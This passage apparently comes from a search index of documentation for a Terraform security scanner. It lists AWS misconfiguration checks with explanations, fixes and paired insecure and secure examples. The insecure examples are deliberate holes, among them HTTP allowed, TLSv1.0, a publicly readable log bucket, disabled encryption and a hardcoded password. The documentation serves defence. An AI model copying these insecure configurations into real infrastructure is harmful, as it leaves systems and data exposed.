<p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#logging_config</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/AccessLogs.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudfront/enable-waf/","text":"","title":"CloudFront distribution does not have a WAF in front."},{"location":"checks/aws/cloudfront/enable-waf/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/cloudfront/enable-waf/#explanation","text":"<p>You should configure a Web Application Firewall in front of your CloudFront distribution. This will mitigate many types of attacks on your web application.</p>","title":"Explanation"},{"location":"checks/aws/cloudfront/enable-waf/#possible-impact","text":"<p>Complex web application attacks can more easily be performed without a WAF</p>","title":"Possible Impact"},{"location":"checks/aws/cloudfront/enable-waf/#suggested-resolution","text":"<p>Enable WAF for the CloudFront distribution</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudfront/enable-waf/#insecure-example","text":"<p>The following example will fail the aws-cloudfront-enable-waf check. <pre><code> resource \"aws_cloudfront_distribution\" \"bad_example\" {\n   origin_group {\n     origin_id = \"groupS3\"\n\n     failover_criteria {\n       status_codes = [403, 404, 500, 502]\n     }\n\n     member {\n       origin_id = \"primaryS3\"\n     }\n   }\n\n   origin {\n     domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n     origin_id   = \"primaryS3\"\n\n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n\n   origin {\n     domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n     origin_id   = \"failoverS3\"\n\n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n\n   default_cache_behavior {\n     target_origin_id = \"groupS3\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudfront/enable-waf/#secure-example","text":"<p>The following example will pass the aws-cloudfront-enable-waf check. <pre><code> resource \"aws_cloudfront_distribution\" \"good_example\" {\n\n   origin {\n     domain_name = aws_s3_bucket.primary.bucket_regional_domain_name\n     origin_id   = \"primaryS3\"\n\n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n\n   origin {\n     domain_name = aws_s3_bucket.failover.bucket_regional_domain_name\n     origin_id   = \"failoverS3\"\n\n     s3_origin_config {\n       origin_access_identity = aws_cloudfront_origin_access_identity.default.cloudfront_access_identity_path\n     }\n   }\n\n   default_cache_behavior {\n     target_origin_id = \"groupS3\"\n   }\n\n   web_acl_id = \"waf_id\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudfront/enable-waf/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#web_acl_id</p> </li> <li> <p>https://docs.aws.amazon.com/waf/latest/developerguide/cloudfront-features.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudfront/enforce-https/","text":"","title":"CloudFront distribution allows unencrypted (HTTP) communications."},{"location":"checks/aws/cloudfront/enforce-https/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/cloudfront/enforce-https/#explanation","text":"<p>Plain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.</p> <p>You should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.</p>","title":"Explanation"},{"location":"checks/aws/cloudfront/enforce-https/#possible-impact","text":"<p>CloudFront is available through an unencrypted connection</p>","title":"Possible Impact"},{"location":"checks/aws/cloudfront/enforce-https/#suggested-resolution","text":"<p>Only allow HTTPS for CloudFront distribution communication</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudfront/enforce-https/#insecure-example","text":"<p>The following example will fail the aws-cloudfront-enforce-https check. <pre><code> resource \"aws_cloudfront_distribution\" \"bad_example\" {\n    default_cache_behavior {\n        viewer_protocol_policy = \"allow-all\"\n      }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudfront/enforce-https/#secure-example","text":"<p>The following example will pass the aws-cloudfront-enforce-https check. <pre><code> resource \"aws_cloudfront_distribution\" \"good_example\" {\n    default_cache_behavior {\n        viewer_protocol_policy = \"redirect-to-https\"\n      }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudfront/enforce-https/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#viewer_protocol_policy</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/using-https-cloudfront-to-s3-origin.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudfront/use-secure-tls-policy/","text":"","title":"CloudFront distribution uses outdated SSL/TLS protocols."},{"location":"checks/aws/cloudfront/use-secure-tls-policy/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/cloudfront/use-secure-tls-policy/#explanation","text":"<p>You should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.</p> <p>Note: that setting minimum_protocol_version = \"TLSv1.2_2021\" is only possible when cloudfront_default_certificate is false (eg. you are not using the cloudfront.net domain name).  If cloudfront_default_certificate is true then the Cloudfront API will only allow setting minimum_protocol_version = \"TLSv1\", and setting it to any other value will result in a perpetual diff in your terraform plan's.  The only option when using the cloudfront.net domain name is to ignore this rule.</p>","title":"Explanation"},{"location":"checks/aws/cloudfront/use-secure-tls-policy/#possible-impact","text":"<p>Outdated SSL policies increase exposure to known vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/aws/cloudfront/use-secure-tls-policy/#suggested-resolution","text":"<p>Use the most modern TLS/SSL policies available</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudfront/use-secure-tls-policy/#insecure-example","text":"<p>The following example will fail the aws-cloudfront-use-secure-tls-policy check. <pre><code> resource \"aws_cloudfront_distribution\" \"bad_example\" {\n   viewer_certificate {\n     cloudfront_default_certificate = aws_acm_certificate.example.arn\n     minimum_protocol_version = \"TLSv1.0\"\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudfront/use-secure-tls-policy/#secure-example","text":"<p>The following example will pass the aws-cloudfront-use-secure-tls-policy check. <pre><code> resource \"aws_cloudfront_distribution\" \"good_example\" {\n   viewer_certificate {\n     cloudfront_default_certificate = aws_acm_certificate.example.arn\n     minimum_protocol_version = \"TLSv1.2_2021\"\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudfront/use-secure-tls-policy/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudfront_distribution#minimum_protocol_version</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/secure-connections-supported-viewer-protocols-ciphers.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudtrail/","text":"","title":"cloudtrail"},{"location":"checks/aws/cloudtrail/#checks","text":"<ul> <li> <p>enable-all-regions Cloudtrail should be enabled in all regions regardless of where your AWS resources are generally homed</p> </li> <li> <p>enable-at-rest-encryption Cloudtrail should be encrypted at rest to secure access to sensitive trail data</p> </li> <li> <p>enable-log-validation Cloudtrail log validation should be enabled to prevent tampering of log data</p> </li> <li> <p>ensure-cloudwatch-integration CloudTrail logs should be stored in S3 and also sent to CloudWatch Logs</p> </li> <li> <p>no-public-log-access The S3 Bucket backing Cloudtrail should be private</p> </li> <li> <p>require-bucket-access-logging You should enable bucket access logging on the CloudTrail S3 bucket.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/cloudtrail/enable-all-regions/","text":"","title":"Cloudtrail should be enabled in all regions regardless of where your AWS resources are generally homed"},{"location":"checks/aws/cloudtrail/enable-all-regions/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/cloudtrail/enable-all-regions/#explanation","text":"<p>When creating Cloudtrail in the AWS Management Console the trail is configured by default to be multi-region, this isn't the case with the Terraform resource. Cloudtrail should cover the full AWS account to ensure you can track changes in regions you are not actively operting in.</p>","title":"Explanation"},{"location":"checks/aws/cloudtrail/enable-all-regions/#possible-impact","text":"<p>Activity could be happening in your account in a different region</p>","title":"Possible Impact"},{"location":"checks/aws/cloudtrail/enable-all-regions/#suggested-resolution","text":"<p>Enable Cloudtrail in all regions</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudtrail/enable-all-regions/#insecure-example","text":"<p>The following example will fail the aws-cloudtrail-enable-all-regions check. <pre><code> resource \"aws_cloudtrail\" \"bad_example\" {\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudtrail/enable-all-regions/#secure-example","text":"<p>The following example will pass the aws-cloudtrail-enable-all-regions check. <pre><code> resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudtrail/enable-all-regions/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail</p> </li> <li> <p>https://docs.aws.amazon.com/awscloudtrail/latest/userguide/receive-cloudtrail-log-files-from-multiple-regions.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/","text":"","title":"Cloudtrail should be encrypted at rest to secure access to sensitive trail data"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/#explanation","text":"<p>Cloudtrail logs should be encrypted at rest to secure the sensitive data. Cloudtrail logs record all activity that occurs in the the account through API calls and would be one of the first places to look when reacting to a breach.</p>","title":"Explanation"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/#possible-impact","text":"<p>Data can be freely read if compromised</p>","title":"Possible Impact"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/#suggested-resolution","text":"<p>Enable encryption at rest</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-cloudtrail-enable-at-rest-encryption check. <pre><code> resource \"aws_cloudtrail\" \"bad_example\" {\n   is_multi_region_trail = true\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-cloudtrail-enable-at-rest-encryption check. <pre><code> resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   enable_log_file_validation = true\n   kms_key_id = var.kms_id\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudtrail/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#kms_key_id</p> </li> <li> <p>https://docs.aws.amazon.com/awscloudtrail/latest/userguide/encrypting-cloudtrail-log-files-with-aws-kms.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudtrail/enable-log-validation/","text":"","title":"Cloudtrail log validation should be enabled to prevent tampering of log data"},{"location":"checks/aws/cloudtrail/enable-log-validation/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/cloudtrail/enable-log-validation/#explanation","text":"<p>Log validation should be activated on Cloudtrail logs to prevent the tampering of the underlying data in the S3 bucket. It is feasible that a rogue actor compromising an AWS account might want to modify the log data to remove trace of their actions.</p>","title":"Explanation"},{"location":"checks/aws/cloudtrail/enable-log-validation/#possible-impact","text":"<p>Illicit activity could be removed from the logs</p>","title":"Possible Impact"},{"location":"checks/aws/cloudtrail/enable-log-validation/#suggested-resolution","text":"<p>Turn on log validation for Cloudtrail</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudtrail/enable-log-validation/#insecure-example","text":"<p>The following example will fail the aws-cloudtrail-enable-log-validation check. <pre><code> resource \"aws_cloudtrail\" \"bad_example\" {\n   is_multi_region_trail = true\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudtrail/enable-log-validation/#secure-example","text":"<p>The following example will pass the aws-cloudtrail-enable-log-validation check. <pre><code> resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   enable_log_file_validation = true\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudtrail/enable-log-validation/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#enable_log_file_validation</p> </li> <li> <p>https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-log-file-validation-intro.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/","text":"","title":"CloudTrail logs should be stored in S3 and also sent to CloudWatch Logs"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/#explanation","text":"<p>CloudTrail is a web service that records AWS API calls made in a given account. The recorded information includes the identity of the API caller, the time of the API call, the source IP address of the API caller, the request parameters, and the response elements returned by the AWS service.</p> <p>CloudTrail uses Amazon S3 for log file storage and delivery, so log files are stored durably. In addition to capturing CloudTrail logs in a specified Amazon S3 bucket for long-term analysis, you can perform real-time analysis by configuring CloudTrail to send logs to CloudWatch Logs.</p> <p>For a trail that is enabled in all Regions in an account, CloudTrail sends log files from all those Regions to a CloudWatch Logs log group.</p>","title":"Explanation"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/#possible-impact","text":"<p>Realtime log analysis is not available without enabling CloudWatch logging</p>","title":"Possible Impact"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/#suggested-resolution","text":"<p>Enable logging to CloudWatch</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/#insecure-example","text":"<p>The following example will fail the aws-cloudtrail-ensure-cloudwatch-integration check. <pre><code>resource \"aws_cloudtrail\" \"bad_example\" {\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/#secure-example","text":"<p>The following example will pass the aws-cloudtrail-ensure-cloudwatch-integration check. <pre><code> resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   cloud_watch_logs_group_arn = \"${aws_cloudwatch_log_group.example.arn}:*\" \n\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n\nresource \"aws_cloudwatch_log_group\" \"example\" {\n  name = \"Example\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudtrail/ensure-cloudwatch-integration/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail</p> </li> <li> <p>https://docs.aws.amazon.com/awscloudtrail/latest/userguide/send-cloudtrail-events-to-cloudwatch-logs.html#send-cloudtrail-events-to-cloudwatch-logs-console</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudtrail/no-public-log-access/","text":"","title":"The S3 Bucket backing Cloudtrail should be private"},{"location":"checks/aws/cloudtrail/no-public-log-access/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/cloudtrail/no-public-log-access/#explanation","text":"<p>CloudTrail logs a record of every API call made in your account. These log files are stored in an S3 bucket. CIS recommends that the S3 bucket policy, or access control list (ACL), applied to the S3 bucket that CloudTrail logs to prevents public access to the CloudTrail logs. Allowing public access to CloudTrail log content might aid an adversary in identifying weaknesses in the affected account's use or configuration.</p>","title":"Explanation"},{"location":"checks/aws/cloudtrail/no-public-log-access/#possible-impact","text":"<p>CloudTrail logs will be publicly exposed, potentially containing sensitive information</p>","title":"Possible Impact"},{"location":"checks/aws/cloudtrail/no-public-log-access/#suggested-resolution","text":"<p>Restrict public access to the S3 bucket</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudtrail/no-public-log-access/#insecure-example","text":"<p>The following example will fail the aws-cloudtrail-no-public-log-access check. <pre><code>resource \"aws_cloudtrail\" \"bad_example\" {\n   s3_bucket_name = \"abcdefgh\"\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n    bucket = \"abcdefgh\"\n    acl = \"public-read\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudtrail/no-public-log-access/#secure-example","text":"<p>The following example will pass the aws-cloudtrail-no-public-log-access check. <pre><code> resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   s3_bucket_name = \"abcdefgh\"\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n\nresource \"aws_s3_bucket\" \"good_example\" {\n    bucket = \"abcdefgh\"\n    acl = \"private\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudtrail/no-public-log-access/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/configuring-block-public-access-bucket.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/","text":"","title":"You should enable bucket access logging on the CloudTrail S3 bucket."},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/#explanation","text":"<p>Amazon S3 bucket access logging generates a log that contains access records for each request made to your S3 bucket. An access log record contains details about the request, such as the request type, the resources specified in the request worked, and the time and date the request was processed.</p> <p>CIS recommends that you enable bucket access logging on the CloudTrail S3 bucket.</p> <p>By enabling S3 bucket logging on target S3 buckets, you can capture all events that might affect objects in a target bucket. Configuring logs to be placed in a separate bucket enables access to log information, which can be useful in security and incident response workflows.</p>","title":"Explanation"},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/#possible-impact","text":"<p>There is no way to determine the access to this bucket</p>","title":"Possible Impact"},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/#suggested-resolution","text":"<p>Enable access logging on the bucket</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/#insecure-example","text":"<p>The following example will fail the aws-cloudtrail-require-bucket-access-logging check. <pre><code>resource \"aws_cloudtrail\" \"bad_example\" {\n   s3_bucket_name = \"abcdefgh\"\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n}\n\nresource \"aws_s3_bucket\" \"good_example\" {\n    bucket = \"abcdefgh\"\n\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/#secure-example","text":"<p>The following example will pass the aws-cloudtrail-require-bucket-access-logging check. <pre><code> resource \"aws_cloudtrail\" \"good_example\" {\n   is_multi_region_trail = true\n   s3_bucket_name = \"abcdefgh\"\n\n   event_selector {\n     read_write_type           = \"All\"\n     include_management_events = true\n\n     data_resource {\n       type = \"AWS::S3::Object\"\n       values = [\"${data.aws_s3_bucket.important-bucket.arn}/\"]\n     }\n   }\n }\n\nresource \"aws_s3_bucket\" \"good_example\" {\n    bucket = \"abcdefgh\"\n    logging {\n        target_bucket = \"target-bucket\"\n    }\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudtrail/require-bucket-access-logging/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudtrail#is_multi_region_trail</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/cloudwatch/","text":"","title":"cloudwatch"},{"location":"checks/aws/cloudwatch/#checks","text":"<ul> <li>log-group-customer-key CloudWatch log groups should be encrypted using CMK</li> </ul>","title":"Checks"},{"location":"checks/aws/cloudwatch/log-group-customer-key/","text":"","title":"CloudWatch log groups should be encrypted using CMK"},{"location":"checks/aws/cloudwatch/log-group-customer-key/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/cloudwatch/log-group-customer-key/#explanation","text":"<p>CloudWatch log groups are encrypted by default, however, to get the full benefit of controlling key rotation and other KMS aspects a KMS CMK should be used.</p>","title":"Explanation"},{"location":"checks/aws/cloudwatch/log-group-customer-key/#possible-impact","text":"<p>Log data may be leaked if the logs are compromised. No auditing of who have viewed the logs.</p>","title":"Possible Impact"},{"location":"checks/aws/cloudwatch/log-group-customer-key/#suggested-resolution","text":"<p>Enable CMK encryption of CloudWatch Log Groups</p>","title":"Suggested Resolution"},{"location":"checks/aws/cloudwatch/log-group-customer-key/#insecure-example","text":"<p>The following example will fail the aws-cloudwatch-log-group-customer-key check. <pre><code> resource \"aws_cloudwatch_log_group\" \"bad_example\" {\n    name = \"bad_example\"\n\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/cloudwatch/log-group-customer-key/#secure-example","text":"<p>The following example will pass the aws-cloudwatch-log-group-customer-key check. <pre><code> resource \"aws_cloudwatch_log_group\" \"good_example\" {\n    name = \"good_example\"\n\n    kms_key_id = aws_kms_key.log_key.arn\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/cloudwatch/log-group-customer-key/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/cloudwatch_log_group#kms_key_id</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonCloudWatch/latest/logs/encrypt-log-data-kms.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/codebuild/","text":"","title":"codebuild"},{"location":"checks/aws/codebuild/#checks","text":"<ul> <li>enable-encryption CodeBuild Project artifacts encryption should not be disabled</li> </ul>","title":"Checks"},{"location":"checks/aws/codebuild/enable-encryption/","text":"","title":"CodeBuild Project artifacts encryption should not be disabled"},{"location":"checks/aws/codebuild/enable-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/codebuild/enable-encryption/#explanation","text":"<p>All artifacts produced by your CodeBuild project pipeline should always be encrypted</p>","title":"Explanation"},{"location":"checks/aws/codebuild/enable-encryption/#possible-impact","text":"<p>CodeBuild project artifacts are unencrypted</p>","title":"Possible Impact"},{"location":"checks/aws/codebuild/enable-encryption/#suggested-resolution","text":"<p>Enable encryption for CodeBuild project artifacts</p>","title":"Suggested Resolution"},{"location":"checks/aws/codebuild/enable-encryption/#insecure-example","text":"<p>The following example will fail the aws-codebuild-enable-encryption check. <pre><code> resource \"aws_codebuild_project\" \"bad_example\" {\n    // other config\n\n    artifacts {\n        // other artifacts config\n\n        encryption_disabled = true\n    }\n }\n\n resource \"aws_codebuild_project\" \"bad_example\" {\n    // other config including primary artifacts\n\n    secondary_artifacts {\n        // other artifacts config\n\n        encryption_disabled = false\n    }\n\n    secondary_artifacts {\n        // other artifacts config\n\n        encryption_disabled = true\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/codebuild/enable-encryption/#secure-example","text":"<p>The following example will pass the aws-codebuild-enable-encryption check. <pre><code> resource \"aws_codebuild_project\" \"good_example\" {\n    // other config\n\n    artifacts {\n        // other artifacts config\n\n        encryption_disabled = false\n    }\n }\n\n resource \"aws_codebuild_project\" \"good_example\" {\n    // other config\n\n    artifacts {\n        // other artifacts config\n    }\n }\n\n resource \"aws_codebuild_project\" \"codebuild\" {\n    // other config\n\n    secondary_artifacts {\n        // other artifacts config\n\n        encryption_disabled = false\n    }\n\n    secondary_artifacts {\n        // other artifacts config\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/codebuild/enable-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/codebuild_project#encryption_disabled</p> </li> <li> <p>https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-codebuild-project-artifacts.html</p> </li> <li> <p>https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-codebuild-project.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/config/","text":"","title":"config"},{"location":"checks/aws/config/#checks","text":"<ul> <li>aggregate-all-regions Config configuration aggregator should be using all regions for source</li> </ul>","title":"Checks"},{"location":"checks/aws/config/aggregate-all-regions/","text":"","title":"Config configuration aggregator should be using all regions for source"},{"location":"checks/aws/config/aggregate-all-regions/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/config/aggregate-all-regions/#explanation","text":"<p>The configuration aggregator should be configured with all_regions for the source. </p> <p>This will help limit the risk of any unmonitored configuration in regions that are thought to be unused.</p>","title":"Explanation"},{"location":"checks/aws/config/aggregate-all-regions/#possible-impact","text":"<p>Sources that aren't covered by the aggregator are not include in the configuration</p>","title":"Possible Impact"},{"location":"checks/aws/config/aggregate-all-regions/#suggested-resolution","text":"<p>Set the aggregator to cover all regions</p>","title":"Suggested Resolution"},{"location":"checks/aws/config/aggregate-all-regions/#insecure-example","text":"<p>The following example will fail the aws-config-aggregate-all-regions check. <pre><code> resource \"aws_config_configuration_aggregator\" \"bad_example\" {\n    name = \"example\"\n\n    account_aggregation_source {\n      account_ids = [\"123456789012\"]\n      regions     = [\"us-west-2\", \"eu-west-1\"]\n    }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/config/aggregate-all-regions/#secure-example","text":"<p>The following example will pass the aws-config-aggregate-all-regions check. <pre><code> resource \"aws_config_configuration_aggregator\" \"good_example\" {\n    name = \"example\"\n\n    account_aggregation_source {\n      account_ids = [\"123456789012\"]\n      all_regions = true\n    }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/config/aggregate-all-regions/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/config_configuration_aggregator#all_regions</p> </li> <li> <p>https://docs.aws.amazon.com/config/latest/developerguide/aggregate-data.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/documentdb/","text":"","title":"documentdb"},{"location":"checks/aws/documentdb/#checks","text":"<ul> <li> <p>enable-log-export DocumentDB logs export should be enabled</p> </li> <li> <p>enable-storage-encryption DocumentDB storage must be encrypted</p> </li> <li> <p>encryption-customer-key DocumentDB encryption should use Customer Managed Keys</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/documentdb/enable-log-export/","text":"","title":"DocumentDB logs export should be enabled"},{"location":"checks/aws/documentdb/enable-log-export/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/documentdb/enable-log-export/#explanation","text":"<p>Document DB does not have auditing by default. To ensure that you are able to accurately audit the usage of your DocumentDB cluster you should enable export logs.</p>","title":"Explanation"},{"location":"checks/aws/documentdb/enable-log-export/#possible-impact","text":"<p>Limited visibility of audit trail for changes to the DocumentDB</p>","title":"Possible Impact"},{"location":"checks/aws/documentdb/enable-log-export/#suggested-resolution","text":"<p>Enable export logs</p>","title":"Suggested Resolution"},{"location":"checks/aws/documentdb/enable-log-export/#insecure-example","text":"<p>The following example will fail the aws-documentdb-enable-log-export check. <pre><code> resource \"aws_docdb_cluster\" \"bad_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 5\n   preferred_backup_window = \"07:00-09:00\"\n   skip_final_snapshot     = true\n   enabled_cloudwatch_logs_exports = \"something\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/documentdb/enable-log-export/#secure-example","text":"<p>The following example will pass the aws-documentdb-enable-log-export check. <pre><code> resource \"aws_docdb_cluster\" \"good_example\" {\n   cluster_identifier      = \"my-docdb-cluster\"\n   engine                  = \"docdb\"\n   master_username         = \"foo\"\n   master_password         = \"mustbeeightchars\"\n   backup_retention_period = 